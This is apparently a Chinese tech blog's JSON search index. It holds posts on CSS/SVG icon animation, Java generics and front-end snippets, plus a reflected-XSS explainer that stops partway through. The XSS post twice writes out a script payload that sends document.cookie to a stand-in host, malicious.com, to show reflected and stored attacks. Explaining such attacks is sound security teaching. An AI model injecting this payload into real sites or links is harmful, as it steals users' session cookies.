[{"title":"图标动画的实现方法","url":"/2020/07/14/icon-animation/","content":"\n在给我的博客主题做移动端适配的时候，菜单会随着屏幕的缩小而隐藏，右上角的按钮会随着菜单的打开和关闭展示不同的图标。\n\n![博客图标](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200802175041.gif)\n\n但是突兀的切换让我心生不爽，于是开启了图标切换动画的探寻之路。经历一番搜寻，总结出下面几种图标变换的实现方式。\n\n## 切换动画\n\n![切换动画](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200802180139.gif)\n\n简单的切换动画并不涉及什么复杂的图标变化，原理就是事先准备好两个图标，把他们重叠在同一个位置，每次只显示其中一个，切换的时候通过调整 `opacity` 和 `“size”` 来达到一种动态切换的效果。下面看慢放是怎么回事。\n\n![慢放切换动画](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200802175611.gif)\n\n弄清楚原理之后直接开始码，下面是简单的 HTML，两个 icon 和一个 `container` 足矣。\n\n```html\n<div class=\"container\">\n  <img src=\"./assets/menu.svg\" class=\"icon icon-menu\">\n  <img src=\"./assets/close.svg\" class=\"icon icon-close\">\n</div>\n```\n\n给 `container` 添加点击事件，点击切换添加 `close` 类。\n\n```javascript\nwindow.onload = function () {\n    document.querySelector('.container').addEventListener('click', function (event) {\n        this.classList.toggle('close');\n    });\n}\n```\n\n接下来就是 CSS，`container` 下默认显示菜单图标，添加 `close` 类后隐藏菜单图标并显示关闭图标。\n\n```css\n.container {\n    width: 96px;\n    height: 96px;\n    border-radius: 4px;\n    position: relative;\n    cursor: pointer;\n}\n\n.container > .icon {\n    width: 72px;\n    height: 72px;\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    transition: all .3s ease-in-out;\n}\n\n.container > .icon-menu,\n.container.close > .icon-close { \n    opacity: 1; transform: translate(-50%, -50%) scale(1);\n}\n.container > .icon-close,\n.container.close > .icon-menu { \n    opacity: 0; transform: translate(-50%, -50%) scale(0);\n}\n\n```\n\n这里有几点值得一提\n\n- 因为两个图标要重叠，所以使用绝对定位和和 `transform` 的方式居中\n- 图标的 `transform` 属性中 `translate` 和 `scale` 的顺序不能改变，如果 `scale` 在前就会出现下面的问题\n\n![切换异常](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200802203716.gif)\n\n- 具体切换效果可以自己定义，例如把 `scale` 换成 `rotate(-180deg)` 和 `rotate(180deg)` 就是下面的效果\n\n![旋转切换](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804102512.gif)\n\n### 一点小改进\n\n例子中图标切换只有两个状态：显示菜单和显示关闭，单独用 JavaScript 添加点击事件动态添加 CSS 类感觉有点没必要。可以考虑通过 `checkbox` 只用 HTML 和 CSS 实现相同的效果。\n\n```html\n<div class=\"container\">\n    <input class=\"checkbox\" id=\"toggle\" type=\"checkbox\">\n    <label class=\"label\" for=\"toggle\">\n        <img src=\"./assets/menu.svg\" class=\"icon icon-menu\">\n        <img src=\"./assets/close.svg\" class=\"icon icon-close\">\n    </label>\n</div>\n```\n\n实现的原理是将两个图标放置在 `label` 中，再把 `label` 和 `checkbox` 绑定，然后通过 CSS 隐藏 `checkbox`，这样就可以通过 `checkbox:checked` 来判断切换状态而不用单独注册点击事件，相关的开关开合逻辑可以注册放在 `checkbox` 的 `change` 事件中，代码是不是有点逻辑和显示分离的感觉了😄。\n\n```css\n.container {\n    width: 96px;\n    height: 96px;\n}\n.checkbox {\n    display: none;\n}\n.label {\n    display: block;\n    width: 100%;\n    height: 100%;\n    position: relative;\n    cursor: pointer;\n}\n.icon {\n    width: 72px;\n    height: 72px;\n    position: absolute;\n    left: 50%;\n    top: 50%;\n}\n.label > .icon-close,\n#toggle:checked ~ label > .icon-menu {\n    opacity: 0;\n    transform: translate(-50%, -50%) scale(0);\n    transition: all .3s;\n}\n.label > .icon-menu,\n#toggle:checked ~ label > .icon-close {\n    opacity: 1;\n    transform: translate(-50%, -50%) scale(1);\n    transition: all .3s;\n}\n```\n\n## 模拟动画\n\n![模拟动画](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804105014.gif)\n\n这个模拟动画的例子可能会感觉和上面的切换动画有点像，其实并不太一样。切换动画是通过 `opacity` 的交替加上一些效果（如旋转，缩放等）来实现图标切换。而模拟动画，直接来看慢放。\n\n![慢放模拟动画](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804105438.gif)\n\n可以看到，模拟动画（morphing transition）是从图标的细节实现的的。要做一个模拟动画，一般来讲将变换前的图标和变换后的图标分成对应的部分，设计好图标的各个部分是如何经过一系列的变化最后构成新图标后就可以开始写了。不像切换动画直接拿图标来用，这里是要手动写图标的。所以对于一些过于复杂的图标，这种方法不是很适用。接下来看代码\n\n```html\n<div class=\"container\">\n    <input class=\"checkbox\" id=\"toggle\" type=\"checkbox\">\n    <label class=\"label\" for=\"toggle\">\n        <i class=\"icon icon-menu\"></i>\n    </label>\n</div>\n```\n\n接着用 `checkbox` 写，在 `label` 中添加 `i` 标签，我们打算用 `::before` 和 `::after` 伪元素来构成默认菜单的三条杠。\n\n```css\n.container {\n    width: 96px;\n    height: 96px;\n    \n    border-radius: 4px;\n    overflow: hidden;\n}\n.checkbox {\n    display: none;\n}\n.label {\n    width: 96px;\n    height: 96px;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    cursor: pointer;\n}\n.icon-menu,\n.icon-menu::before,\n.icon-menu::after {\n    width: 72px;\n    height: 12px;\n    background-color: black;\n    display: block;\n    transition: all 3s;\n}\n.icon-menu {\n    position: relative;\n}\n.icon-menu::before,\n.icon-menu::after {\n    position: absolute;\n    content: '';\n}\n.icon-menu::before {\n    top: -24px;\n}\n.icon-menu::after {\n    top: 24px;\n}\n```\n\n到这里为止，一个 `menu` 图标就用 HTML 和 CSS 的方式写出来了，接下来加动画。\n\n```css\n#toggle:checked ~ label .icon-menu {\n    transform: rotate(225deg);\n}\n#toggle:checked ~ label .icon-menu::before {\n    top: 0;\n    transform: rotate(90deg);\n}\n#toggle:checked ~ label .icon-menu::after {\n    top: 0;\n}\n```\n\n代码只有几行，因为我们要写的变换比较简单，第一条杠顺时针 45 度，第二三条杠逆时针 45 度旋转构成一个 X 图标，然后调整旋转的圈数让动画看起来复杂一些，最后选择的是 225 和 90，看起来还比较舒服。\n\n模拟动画的实现方式也有很多，这里我选择用伪元素求简单反而导致能实现的效果受到了限制（想实现中间那条杠慢慢变短，但是因为这里伪元素的绝对定位没办法缩放）。用三个 `span` 标签的可能会更好，下面是一个别人写的 [Material Morphing Icons](https://codepen.io/albebonv/full/gIlrw)，然后再推荐一个比较有名的库 [hamburgers](https://github.com/jonsuh/hamburgers)。\n\n![](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804111851.gif)\n\n\n\n## SVG 动画\n\n![SVG动画](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804112649.gif)\n\n说到图标动画应该是绕不开 SVG 的，原理是和模拟动画类似，但是 SVG 更加灵活容易操作，而且也可以应付复杂的图标和动画。一样慢动作回放看效果。\n\n![慢放SVG](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804113048.gif)\n\n中间缩短消失，然后上下旋转组成 X。这里我用的 `snapsvg` 写的。首先在 HTML 文件中插入 `snap.js`。\n\n```html\n<script src=\"./snap.svg-min.js\"></script>\n```\n\n开始写图标\n\n```js\nvar container = Snap(96, 96);\nvar rectTop = container.rect(12, 20, 72, 10);\nvar rectMed = container.rect(12, 42, 72, 10);\nvar rectBot = container.rect(12, 64, 72, 10);\n```\n\n然后是动画。\n\n```javascript\nvar closeState = false;\ncontainer.click(function () {\n    if (closeState) { // 默认 menu\n        rectTop.animate({\n            transform: null\n        }, 300, mina.easeinout);\n        rectMed.animate({\n            transform: null\n        }, 300, mina.easeinout);\n        rectBot.animate({\n            transform: null\n        }, 300, mina.easeinout);\n    } else {\n        rectTop.animate({ // 第一条杠位移到中间同时旋转45度（相对自身中心点旋转）\n            transform: 't0, 22 r45 ' + rectTop.getBBox().cx +\n            ' ' + rectTop.getBBox(0).cy\n        }, 300, mina.easeinout);\n        rectMed.animate({ // 中间的杠长度缩小消失\n            transform: 's0, 1'\n        }, 300, mina.easeinout);\n        rectBot.animate({ // 第三条杠位移到中间同时旋转-45度（相对自身中心点旋转）\n            transform: 't0, -22 r-45 ' + rectBot.getBBox().cx +\n            ' ' + rectBot.getBBox(0).cy\n        }, 300, mina.easeinout);\n    }\n    closeState = !closeState; // 更新 closeState\n});\n```\n\n`snapsvg` 只是粗略研究了一会文档就开始写了，这里的动画实现应该有更简便的方法，有时间再另外探究。\n\n感谢阅读","tags":["CSS"]},{"title":"Java 泛型深入","url":"/2020/07/05/java-generic-types/","content":"\n\n本片文章面向像我一样，已经基本了解泛型，知道如何使用泛型类或者方法，但是在一些细节上有点模棱两可，偶尔需要在 IDE 的帮助下才能写出正确的代码的朋友。看开篇的思考题，如果你很清楚知道答案（在最后一节），就不用费时间读下去了。\n\n## 思考题\n\n1. 考虑一个名为 `Shape` 的类有 `Oval` 和 `Rectangle` 两个子类，请问下列 Java 代码，哪几行不能正确编译？\n\n   ```java\n   // 1\n   Collection<Object> shapes = new ArrayList<Shape>();\n   // 2\n   Collection<Shape> shapes = new ArrayList<Shape>();\n   // 3\n   Collection<?> shapes = new ArrayList<Oval>();\n   // 4\n   Collection<Shape> shapes = new ArrayList<Oval>();\n   // 5\n   Collection<Shape> = new ArrayList<? extends Shape>();\n   // 6\n   List<Shape> shapes = new ArrayList<Oval>();\n   // 7\n   List<? extends Shape> shapes = new ArrayList<Oval>();\n   // 8\n   Object[] shapes = new ArrayList<Shape>[];\n   // 9\n   ArrayList<Shape>[] shapes = new ArrayList<Shape>[];\n   // 10\n   ArrayList<Shape> shapes = new ArrayList<Oval>();\n   // 11\n   ArrayList<? super Shape> shapes = new ArrayList<Object>();\n   ```\n\n2. 给出排序接口，\n\n   ```java\n   import java.util.List;\n   \n   public interface Sort<T extends Comparable<T>> {\n       List<T> sort(List<T> ts);\n   }\n   ```\n\n   以下快速排序的类签名哪个是正确的(不考虑实现)\n\n   ```java\n   import java.util.List;\n   // 1\n   public class QuickSort<T> implements Sort<T>\n   // 2\n   public class QuickSort<T> implements Sort<T extends Comparable<T>>\n   // 3\n   public class QuickSort<T extends Comparable<T>> implements Sort<T>\n   // 4\n   public class QuickSort<T extends Comparable<T>> implements Sort<T extends Comparable<T>>\n   ```\n\n要解决这些问题，我将从以下两节深入理解 Java 泛型。\n\n## 类型擦除(Type Erasure)\n\nJava 中的泛型是通过一种叫 Type Erasure 的方式实现的。编译器在编译完代码擦除了泛型，因此在运行时 (runtime) 泛型是不可见的。这种方法使得带有泛型的代码能够向后兼容 JDK 1.5 之前的原生类型(raw types)。下面通过两个例子来看看类型擦除是怎么做的，\n\n### 擦除无界类型\n\n对以下无界泛型类，\n\n```java\npublic class Data<T> {\n  private T data;\n  \n  public void setData(T data) {\n    this.data = data;\n  }\n  \n  public T getData() {\n    return this.data;\n  }\n  \n  public static void main(String[] args) {\n    Data<String> data = new Data<>();\n    data.setData(\"Hello\");\n    String s = data.getData();\n  }\n}\n```\n\n擦除泛型后虚拟机执行的代码如下所示\n\n```java\npublic class Data {\n  private Object data;\n  \n  public void setData(Object data) {\n    this.data = data;\n  }\n  \n  public Object getData() {\n    return this.data;\n  }\n  \n  public static void main(String[] args) {\n    Data data = new Data();\n    data.setData(\"Hello\");\n    String s = (String) data.getData();\n  }\n}\n```\n\n可以发现对无界类型\n\n- 编译器会把泛型替换成 `Object` \n- 需要转型的时候，编译器会根据 T 的类型添加强制类型转换\n\n### 擦除有界类型\n\n对以下有界泛型方法，\n\n```java\npublic static <E extends GeometricObject> boolean equalArea(E o1, E o2) {\n  return o1.getArea() == o2.getArea();\n}\n```\n\n擦除泛型后虚拟机执行的代码如下所示\n\n```java\npublic static boolean equalArea(GeometricObject o1, GeometricObject o2) {\n\treturn o1.getArea() == o2.getArea();\n}\n```\n\n如果泛型是有界的，编译器则会将其替换成有界的类型。\n\n### 擦除局限\n\n类型擦除失去了在泛型代码中执行特定操作的能力，任何在运行时需要知道具体类型的代码无法正常工作。\n\n* **不能 new T 类型的对象**\n\n  因为没有办法确定 T 类型是包含有无参的构造函数\n\n* **不能创建泛型数组[ ]**\n\n  Java 中数组支持协变，泛型是不变的，见后。\n\n* **泛型不能是静态成员**\n\n  静态属性只跟随类存在一份，如果允许静态属性是泛型参数类型，则对不同的实例化会产生歧义\n\n* **不能对泛型参数类型转换或者 instanceof**\n\n* **不能通过不同的泛型类型重载方法**\n\n  ```java\n  public void print(Set<String> set) { ... }\n  public void print(Set<Integer> set) { ... }\n  ```\n\n* **自定义异常不能带泛型参数**\n\n  ```java\n  try {\n    doSomething();\n  } catch (MyExp<Integer> e) {\n    doA();\n  } catch (MyExp<String> e2) {\n    doB()\n  } \n  // 因为类型擦除，所以 MyExp<Integer> 和 MyExp<String> 都是 MyExp，\n  // 无法判断最后去了哪一个 catch 分支\n  ```\n\n## 逆变与协变\n\n编程语言中协变和逆变用来描述类型转换后的继承关系，定义为：如果 $A$，$B$ 表示类型，$f(\\cdot)$ 表示类型转换，$\\leq$ 表示继承关系\n\n- 当 $A \\leq B$ 时有 $f(B) \\leq f(A)$ 成立，则 $f(\\cdot)$ 是逆变 (contravariant) 的；\n- 当 $A \\leq B$ 时有 $f(A) \\leq f(B)$ 成立，则 $f(\\cdot)$ 是协变 (covariant) 的；\n- 当 $A \\leq B$ 时，$f(A)$ 和 $f(B)$ 无关，则 $f(\\cdot)$ 是不变 (invariant) 的；\n\n在 Java 中，泛型**本身**是不变的。`Integer` 是 `Number` 的子类，但是 `ArrayList<Integer>` 和 `ArrayList<Number>` 没有任何关系。也即 `ArrayList<Number> list = new ArrayList<Integer>()` 不能正确通过编译。这里我想引用 Thinking in Java 中的原话\n\n>  A **List** of **Apple** is not a **List of Fruit**. A **List** of **Apple** will hold **Apples** and subtypes of **Apple**, and a **List of Fruit** will hold any kind of **Fruit**. Yes, including **Apples**, but that doesn’t make it a **List of Apple;** [^Thinking-in-Java]\n>\n> 一篮苹果不是一篮水果。一篮苹果装着苹果和它的亚种，而一篮水果装着各种水果，水果的确包含苹果，但并不代表它就是一篮苹果。\n\n看个具体的例子吧，考虑以下代码：\n\n```java\nArrayList<Integer> integers = new ArrayList<Integer>();\nintegers.add(new Integer(6));\nArrayList<Number> numbers = integers; // 假如可以向上转型\nnumbers.add(new Float(6.6));\nInteger n = integers.get(1); // ClassCastException\n```\n\n假设第三行代码是成立的，就有可能产生像最后一行这样错误的代码。实际上在编译过程中第三行就就直接报错了 `Type mismatch: cannot convert from ArrayList<Integer> to ArrayList<Number>` 。\n\n### 泛型通配符\n\n试着写一个方法，它支持打印类型为 `Integer`、`Long`、`Byte`、`Double`、`Float` 或者 `Short` 的数组。这时你就会发现，方法参数传入 `List<Number>` 没有办法向下转型为 `List<Subtype of Number>`，总得有个方法来做类似的事情，于是为了使泛型具有协变或者逆变性，泛型通配符出现了。\n\n```java\npublic static void print(List<? extends Number> list) {\n  for (int i = 0; i < list.size(); i++) {\n    System.out.println(list.get(i));\n  }\n}\n```\n\n### extends 和协变\n\n当我们看见 `<? extends Number>` 时，我们不能把它当成是继承自 `Number` 的任何类型。因为它并不意味着 `List<? extends Number>` 将会包含任意类型的 `Number`。恰恰相反，通配符只指代一个明确的类型。所以被赋值给 `List<? extends Number>` 的 `List` 必须带有一个具体的类型，至于该类型是 `Integer` 还是 `Double` 无关紧要。那么问题来了，我们可以拿这个 list 来做什么呢，来看以下例子\n\n```java\nList<? extends Number> numbers = new ArrayList<Integer>(); // covariance\nnumbers.add(new Integer(5)); // Not applicable\nnumbers.add(new Double(3.4)); // Not applicable\nnumbers.add(null); // works\n```\n\n这不是什么都做不了吗？并不是这样的，如果不知道 `numbers` 里放着的具体是什么类型，是没有办法安全地添加一个对象的。但是可以保证的是，编译器确定从 `numbers` 中取出的对象是 `Number` 类型的。也就是说 `Number n = numbers.get(0)` 没有任何问题，只不过在这个例子中得出的结果是 `null`。**编译器不允许具有协变性的参数化类型引用进行写入操作 ( null 除外)，允许读取操作。**\n\n这里回答前面的问题，为什么不能创建泛型数组。在 Java 中，数组是协变的，也即 `Number[] numbers = new Integer[5]` 是可以通过编译的，如果 `ArrayList<? extends Number>[] arr = new ArrayList<Integer>[5]` 也可以通过编译，就有可能产生 `arr[0] = new ArrayList<Double>()` 的错误代码，所以创建泛型数组是不被允许的。\n\n### super 和逆变\n\n和使用 extends 关键字产生的协变类似，使用 super 关键字则作用于逆变，考虑以下代码\n\n```java\nArrayList<Number> numbers = new ArrayList<>();\nnumbers.add(new Double(3.5));\nnumbers.add(new Integer(5));\nnumbers.add(new Float(3.5f));\n\nArrayList<? super Integer> integers = numbers; // contravariance\nintegers.add(new Integer(3)); // works\nintegers.add(5); // autoboxing works [3.5, 5, 3.5, 3, 5]\n\nInteger n = integers.get(4); // cannot convert ? super Integer to Integer\nNumber n = integers.get(4); // cannot convert ? super Integer to Number\nObject n = integets.get(4);\n```\n\n逆变存在于第六行代码，也就是类型为 `ArrayList<? super Integer>` 的 integers 指向类型为 `ArrayList<Number>` 的 `numbers`，接下来的操作成功添加了两个整数（其中一个 int 为[自动装箱](https://docs.oracle.com/javase/tutorial/java/data/autoboxing.html)），而对于读取操作，只能取出 Object 类型的对象。由此我们可以知道，和协变的属性相反：**对于具有逆变性的参数化类型引用，只能读取出 Object 类型的对象，可以写入类型为通配符下界的对象。**\n\n### PECS 原则\n\n对于什么时候用 `extends` 或者 `super` 的问题，Effective Java 的作者提出了 PECS 原则，也就是 **Producer Extends Consumer Super**。[^Effective-Java]下面我们通过原文具体的代码来解释，\n\n#### Producer Extends\n\n考虑 Java 集合中的 `Stack<E>`，假设我们想给它添加一个 `pushAll` 方法，该方法接受一组元素并把他们放入栈顶，我们马上写出如下代码。\n\n```java\npublic void pushAll(Iterable<E> src) {\n  for (E e: src) {\n    push(e);\n  }\n}\n```\n\n以上代码可以正确编译，但是它仅仅推入和栈相同类型的元素。假设我们有一个 `Number` 栈，想放入 `Integer` 元素，如以下代码所示\n\n```java\nStack<Number> numbers = new Stack<Number>();\nIterable<Integer> integers = ...;\nnumbers.pushAll(integers); // not applicable\n```\n\n代码会报错，因为 `Iterable<Integer>` 和 `Iterable<Number>` 没有关系，通过通配符，我们可以将方法头修改为如下代码 `public void pushAll(Iterable<? extends E> src)`  就可以了。在这个例子中，通配符参数化的泛型充当 E 类型的生产者的角色（读取自身元素到 Stack ）。\n\n#### Consumer Super\n\n同样的假设我们想给 `Stack<E>` 添加一个 `popAll` 方法，该方法接收一个集合，拿出该栈所有的元素并添加到其中。\n\n```java\npublic void popAll(Collection<E> dst) {\n  while(!isEmpty()) {\n    dst.add(pop());\n  }\n}\n```\n\n同样的错误会报出当你想把一个 `Stack<Number>` 地元素放进 `Collection<Object>` ，将方法签名修改为 `public void popAll(Collection<? super E> dst)` 即可。在这个例子中，通配符参数化的泛型充当 E 类型消费者的角色（写入 Stack 元素到自身）。\n\n### 结论\n\n其实理解以上内容并不难，最大的问题还是在于对通配符的认识上。\n\n> 我们都知道 `?` 或 `? extends Object` 代表一个未知类型，表面看上去它代表什么类型都可以，然后你可能会把它当作任意类型了。于是你会把 `<?>` 读作可持有任意类型的参数化类型。同理，把 `<? extends T>` 读作可持有任意 `T` 或其子类型的参数化类型，把 `<? super T>` 读作可持有任意 `T` 或其父类型的参数化类型。[^JavaSE泛型进阶]\n\n而实际上通过本节代码的例子，`?` 并不是代表任意类型，它仅仅代表**一个未知类型，一个什么类型都可以，但是具体不知道是什么的类型**，所以应该把 `List<?>` 读作持有未知类型的 `List`，**应该把使用通配符进行参数化的类型读作一个可持有某种包含于指定类型区间之内的未知类型的参数化类型**。\n\n理清以上解释后加上前面的例子，小结如下：\n\n- **通配符的作用就是给泛型增加变性**\n\n- **通配符上界增加协变性，通配符下界增加逆变性**\n- **协变性泛型是“只读”的，逆变性泛型是“只写”的**\n- **Producer Extends Consumer Super**\n\n## 一个有趣的细节\n\n为什么 `Map<K, V>` 中 `get` 方法没有完全泛型化，而 `put` 是完全泛型化的。[^深入Java泛型]\n\n```java\nV put(K key, V value);\nV get(Object key);\n```\n\n因为你在**查找的 entry 的 key 没必要和你传入 get 方法中的参数类型一致**，方法的具体实现只要求了他们相等。在 Java 中，有很多情况下两个对象类型不同，但是 `equals` 方法依然返回 `true`。例如，`List.equals()` 的实现说，两个列表都为 `List` 类型，并且具有相同的内容，即使它们是 `List` 的不同实现，也是相等的。回到这个问题，可能有一个 `Map<ArrayList, Something>`，我可以使用 `LinkedList` 作为参数调用 `get()`，并且它应该检索具有相同内容的列表的键。 如果 `get()` 接受泛型参数则会限制了它的参数类型，那就没办法检索出来，显然这是不对的。[^whynotgeneric]\n\n## 答案\n\n1.  \\#1 \\#4 \\#5 \\#6 \\#8 \\#9 \\#10 无法编译\n\n2. \\#3 是正确签名\n\n\n\n\n\n[^Thinking-in-Java]: Thinking in Java\n[^JavaSE泛型进阶]: [JavaSE 学习笔记 - 泛型进阶](https://extremegtr.github.io/2016/05/30/JavaSE-study-advanced-generics/)\n[^Effective-Java]: Effective Java\n[^whynotgeneric]: [stackoverflow](https://stackoverflow.com/questions/857420/what-are-the-reasons-why-map-getobject-key-is-not-fully-generic)\n[^深入Java泛型]: [深入 Java 泛型](http://zuoqy.com/2015/05/19/java-generic/#refs)","tags":["Java","泛型"]},{"title":"前端小技巧","url":"/2020/06/28/front-end-tips/","content":"\n\n::: info\n\n最近更新 2020/08/03\n\n:::\n\n## JavaScript\n\n### 允许多个 onload 事件\n\n```javascript\nvar addLoadEvent = function (func) {\n  var oldonload = window.onload\n  if (typeof window.onload != 'function') {\n    window.onload = func\n  } else {\n    window.onload = function () {\n      oldonload()\n      func()\n    }\n  }\n}\n```\n\n### groupBy ｜ aggregate\n\n```javascript\nvar groupBy = function(xs, key) {\n  return xs.reduce(function(rv, x) {\n    (rv[x[key]] = rv[x[key]] || []).push(x);\n    return rv;\n  }, {});\n};\n\nvar a = [\n  {a: 1, b: 2, c: 3},\n  {a: 1, b: 3, c: 4},\n  {a: 2, b: 9, c: 9},\n  {a: 2, b: 9, c: 8}\n];\n\ngroupBy(a, 'a');\n\n// {\n//   '1': [ { a: 1, b: 2, c: 3 }, { a: 1, b: 3, c: 4 } ],\n//   '2': [ { a: 2, b: 9, c: 9 }, { a: 2, b: 9, c: 8 } ]\n// }\n```\n\n### base64<=>blob\n\n```javascript\nbase64toBlob(dataURI) {\n    // convert base64/URLEncoded data component to raw binary data held in a string\n    let byteString;\n    if (dataURI.split(',')[0].indexOf('base64') >= 0) {\n        byteString = atob(dataURI.split(',')[1]);\n    } else {\n        byteString = unescape(dataURI.split(',')[1]);\n    }\n    // separate out the mime component\n    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];\n    // write the bytes of the string to a typed array\n    const ia = new Uint8Array(byteString.length);\n    for (let i = 0; i < byteString.length; i++) {\n        ia[i] = byteString.charCodeAt(i);\n    }\n    return new Blob([ ia ], {type : mimeString});\n}\n\nblobToB64(blob) {\n    return new Promise((resolve, reject) => {\n        const reader = new FileReader();\n        reader.readAsDataURL(blob);\n        reader.onload = () => {\n            resolve(reader.result);\n        };\n    });\n}\n```\n\n### Screen Scroll Event\n\n```javascript\nvar prevScrollpos = window.pageYOffset;\nwindow.onscroll = function() {\n  var currentScrollPos = window.pageYOffset;\n  if (prevScrollpos > currentScrollPos) {\n    // screen up\n    ...\n  } else {\n    // screen down\n    ...\n  }\n  prevScrollpos = currentScrollPos;\n}\n\n// 如果是元素的内滚动则为把 window 换成该元素，pageYOffset/pageXOffset 换为 scrollTop/scrollLeft\n```\n\n\n\n## CSS\n\n### vertical centering 奇淫巧技\n\n```css\n.parent {\n    display: inline-block;\n    width: 300px;\n    height: 300px;\n    font-size: 0;\n    background: #80848f;\n    text-align: center;\n}\n.parent:before {\n    display: inline-block;\n    width: 20px;\n    height: 100%;\n    content: '';\n    background: #ff9900;\n    vertical-align: middle;\n}\n.child {\n    display: inline-block;\n    width: 50px;\n    height: 50px;\n    background: #19be6b;\n    vertical-align: middle;\n```\n\n### 标题编号\n\n```css\nbody {counter-reset: h2}\n  h2 {counter-reset: h3}\n  h3 {counter-reset: h4}\n  h4 {counter-reset: h5}\n  h5 {counter-reset: h6}\n  h2:before {counter-increment: h2; content: counter(h2) \". \"}\n  h3:before {counter-increment: h3; content: counter(h2) \".\" counter(h3) \". \"}\n  h4:before {counter-increment: h4; content: counter(h2) \".\" counter(h3) \".\" counter(h4) \". \"}\n  h5:before {counter-increment: h5; content: counter(h2) \".\" counter(h3) \".\" counter(h4) \".\" counter(h5) \". \"}\n  h6:before {counter-increment: h6; content: counter(h2) \".\" counter(h3) \".\" counter(h4) \".\" counter(h5) \".\" counter(h6) \". \"}\n  h2.nocount:before, h3.nocount:before, h4.nocount:before, h5.nocount:before, h6.nocount:before { content: \"\"; counter-increment: none }\n```\n\n### 悬停下划线\n\n```css\na {\n    text-decoration: none;\n}\n.link--underline {\n    position: relative;\n}\n.link--underline:before {\n    content: \"\";\n    position: absolute;\n    width: 100%;\n    height: 2px;\n    bottom: 0;\n    left: 0;\n    background-color: #233333;\n    visibility: hidden;\n    transform: scaleX(0);\n    transition: all .2s ease-in-out;\n}\n.link--underline:hover:before {\n    visibility: visible;\n    transform: scaleX(1);\n}\n```\n\n### checkbox 自定义样式\n\n```css\n/* Base for label styling */\n[type=\"checkbox\"]:not(:checked),\n[type=\"checkbox\"]:checked {\n  position: absolute;\n  left: -9999px;\n}\n[type=\"checkbox\"]:not(:checked) + label,\n[type=\"checkbox\"]:checked + label {\n  position: relative;\n  padding-left: 1.95em;\n  cursor: pointer;\n}\n\n/* checkbox aspect */\n[type=\"checkbox\"]:not(:checked) + label:before,\n[type=\"checkbox\"]:checked + label:before {\n  content: '';\n  position: absolute;\n  left: 0; top: 0;\n  width: 1.25em; height: 1.25em;\n  border: 2px solid #ccc;\n  background: #fff;\n  border-radius: 4px;\n  box-shadow: inset 0 1px 3px rgba(0,0,0,.1);\n}\n/* checked mark aspect */\n[type=\"checkbox\"]:not(:checked) + label:after,\n[type=\"checkbox\"]:checked + label:after {\n  content: '\\2713\\0020';\n  position: absolute;\n  top: .15em; left: .22em;\n  font-size: 1.3em;\n  line-height: 0.8;\n  color: #09ad7e;\n  transition: all .2s;\n  font-family: 'Lucida Sans Unicode', 'Arial Unicode MS', Arial;\n}\n/* checked mark aspect changes */\n[type=\"checkbox\"]:not(:checked) + label:after {\n  opacity: 0;\n  transform: scale(0);\n}\n[type=\"checkbox\"]:checked + label:after {\n  opacity: 1;\n  transform: scale(1);\n}\n/* disabled checkbox */\n[type=\"checkbox\"]:disabled:not(:checked) + label:before,\n[type=\"checkbox\"]:disabled:checked + label:before {\n  box-shadow: none;\n  border-color: #bbb;\n  background-color: #ddd;\n}\n[type=\"checkbox\"]:disabled:checked + label:after {\n  color: #999;\n}\n[type=\"checkbox\"]:disabled + label {\n  color: #aaa;\n}\n/* accessibility */\n[type=\"checkbox\"]:checked:focus + label:before,\n[type=\"checkbox\"]:not(:checked):focus + label:before {\n  border: 2px dotted blue;\n}\n\n/* hover style just for information */\nlabel:hover:before {\n  border: 2px solid #4778d9!important;\n}\n```\n\n","tags":["JavaScript","tips","CSS"]},{"title":"反射型 XSS 疑问及延伸 (CSRF)","url":"/2019/04/07/XSS-discussion/","content":"\n\n## 有关反射型 XSS 的疑问\n\n学习 XSS (Cross-Site Scripting，跨站脚本攻击) 的时候可以了解到 XSS 分为三种：持久型 (type-2)，反射型 (type-1) 和基于 DOM 型 (type-0) 。  \n在看反射型的时候，总结一下大多数帖子给出的解释：**恶意脚本本身是作为请求参数发送到站点页面存在漏洞的地方（通常是搜索框），然后脚本反射（出现）在新渲染（或者部分刷新）的页面并执行。**\n\n接下来看例子：  \n用户在一个不防范 XSS 的网站中搜索内容，关键字为 XXX，如果网站内包含 XXX的内容，那么该内容就会被展示出来，如果网站中不包含相关，那么可能会提示 XXX 相关内容不存在。也就是，用户的搜索内容最终都会以某种方式反射到搜索结果中。如果搜索内容为：`<script>alert(1)</script>`，那么页面就会执行这段 JavaScript 代码，也即该网站存在 XSS 漏洞。\n\n**那么问题来了：** 作为不懂 JavaScript 的用户，是不可能自己在搜索框中输入恶意脚本攻击自己的。大部分网上的帖子给出的例子到以上内容为止，解释了什么是反射型 XSS，但是却没有说明如何进行攻击。我猜想是通过例如 `www.example.com?search=<script>window.location='http://malicious.com/?data=' + document.cookie</script>` 这样的恶意链接做到的，经历一番搜寻求证，还是在一些博客中有提及的确是这样做的（具体查看文末参考）。\n\n## XSS 小结\n\n上文提到，XSS 可以分为三种，持久型（Persistent），反射型（Reflected），和基于 DOM 型（DOM-Based）。仔细来讲一下这三者吧。  \n\n### 持久型\n\n#### 定义\n\n**恶意脚本被攻击者上传到合法的服务器中，并在常规的页面浏览过程中返回给普通用户并被执行。**\n\n#### 例子\n\n攻击者在一个博客网站中的一篇博客下评论 `<script>window.location='http://malicious.com/?data=' + document.cookie</script>`，恶意代码就会在所有访问这篇博客评论的用户的浏览器中执行。\n\n### 反射型\n\n#### 定义\n\n上文提过了，这里重复一遍：**恶意脚本本身是作为请求参数发送到站点页面存在漏洞的地方（通常是搜索框），然后脚本反射（出现）在新渲染（或者部分刷新）的页面并执行。**\n\n#### 例子\n\n例子就不重复，开头给出了具体的例子。不过查阅的文章中有张图很形象，这里引用一下  \n![反射型 XSS 图片说明](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627154124)\n\n### 基于 DOM 型\n\n#### 